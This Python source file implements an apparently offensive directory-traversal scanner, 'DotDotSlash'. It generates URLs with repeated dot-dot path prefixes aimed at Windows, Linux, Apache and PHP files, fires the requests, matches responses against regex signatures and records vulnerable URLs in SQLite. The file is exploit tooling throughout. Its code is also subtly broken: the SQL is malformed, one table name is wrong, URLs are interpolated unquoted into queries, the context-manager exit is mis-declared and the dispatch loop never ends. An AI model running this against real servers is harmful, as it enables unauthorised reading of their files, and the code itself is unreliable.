from src.match import befvar, dotvar, match
from os.path import exists, join
from os import remove, getcwd, getcwd
import sys
from pathlib import Path
import http.cookiejar
import requests
import asyncio
import aiohttp
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import queue
import re
import sqlite3
import logging

class DotDotSlash:
    def __init__(
        self,
        url: str,
        target: str,
        cookies: dict[str, str] = {},
        headers: dict[str, str] = {},
        db_file: str            = "./db.sqlite3",
        depth: int              = 0,
        include: list[str]      = ["windows","linux","apache","php"],
        method: str             = "get") -> None:
        '''
        Create an exploiter class.

        :param url:     The url to exploit.
        :param target:  The target keyword that should be replaced by the filename generated by the application.
        :param cookies: A dict of cookies to pass to requests.
        :param headers: A dict of additional headers to pass to requests.
        :param db_file: The sqlite3 database file where all generated urls should be saved.
        :param depth:   The depth of urls to generate. The larger this number is, the harded the application tries to find the target.
        :param include: The operating systems to target.
        '''

        self._connection           = sqlite3.connect(db_file)
        self.depth: int            = depth
        self.url                   = url
        self.target                = target
        self.logger                = logging.getLogger(self.__class__.__name__)
        self.include               = include
        self.method                = method
        self.match: dict[str, str] = {}

        self._seed()
        self._create_links()
        self.cookies = cookies
        self.headers = headers
    
    def _seed(self) -> None:
        cur = self._connection.cursor()
        cur.execute("DROP TABLE IF EXISTS urls")
        with open(join(getcwd(),'src','seed.sql'), "r") as f:
            cur.executescript(f.read())
    
    def _create_links(self) -> None:
        '''
        Create the links and cache them in a file for later use. This saves a bit of time
        though this operation is not particularily resource-intensive.

        :param: url - The url containing the `target`.
        :param: target - The target to be replaced in the url.
        :param: depth - The depth at which the tool should go. This causes it to append more and more paths at the beginning
        of the request in order to crack the target.
        :param: force - Whether or not the file should be deleted if it already exists.
        :param: file - The path of the file to which the URLs should be saved. If empty, the default location is at
        the root of the project. The file path may be absolute or relative.
        :param: include - Which systems to target. Can be any combination of windows, linux, apache, and php. The field is case insensitive.
        '''
        cur = self._connection.cursor()

        self.words = []
        self.include = [s.lower() for s in self.include]

        for possible_system, system_words in match.items():
            # match.keys returns the systems. Each system is itself a dict.
            if possible_system in self.include:
                words = system_words.keys()
                self.words.extend(list(words))
                for word, pattern in system_words.items():
                    self.match.update({
                        word: pattern
                    })
            else:
                self.logger.error("Skipping system %s as it is not inlcuded in the target sytems." % possible_system)

        duplicate = []
        if self.target not in self.url:
            raise ValueError("target %s not in url %s" % (self.target, self.url)) 
        for count in range(self.depth + 1):
            for var in dotvar:
                for bvar in befvar:
                    for word in self.words:
                        rewrite = bvar + (var * count) + word
                        fullrewrite = self.url.replace(self.target, rewrite)
                        if fullrewrite not in duplicate:
                            # save to the file
                            cur.execute("INSERT INTO urls (url, word, depth, vulnerable, tested) VALUES (?, ?, ?, ?, ?)", (fullrewrite, word, self.depth, 0, 0))
                            duplicate.append(fullrewrite)
    def close(self):
        '''
        Close a session. Ends connection with the database. This should only be used
        when no further requests are planned to be made.
        '''
        self._connection.close()
    def __enter__(self):
        return self
    def __exit__(self):
        self.close()

    def call_endpoint(
        self,
        url: str,
        word: str):
        '''
        Sends a request to the provided endpoint and runs checks on the data.

        :param endpoint: The enpoint to request.
        :param headers:  The headers to pass to the provided endpoint.
        :param method:   The `requests` method to pass to the provided endpoint.
        '''
        r = requests.request(
            self.method, 
            url, 
            headers = self.headers, 
            cookies = self.cookies)
        return bool(re.findall(str(self.match[word]), r.text))
    
    def dispatch(self) -> None:
        '''
        Dispatch requests and update the database.
        :param: file - The file containing the URLs to disptach.
        '''
        cur = self._connection.cursor()
        while True:
            i, url, word = cur.execute("SELECT (id, url, word) FROM urls WHERE tested = 0").fetchone()
            cur.execute(f"UPDATE urls SET tested = 1 WHERE id = {i}")
            futures = {}
            with ThreadPoolExecutor() as tpe:
                futures.update({tpe.submit(self.call_endpoint, url, word): url})
                for future in as_completed(futures):
                    url = futures[future]
                    is_vuln = future.result()
                    if is_vuln:
                        cur.execute(f"UPDATE url SET vulnerable = 1 WHERE url = {url}")


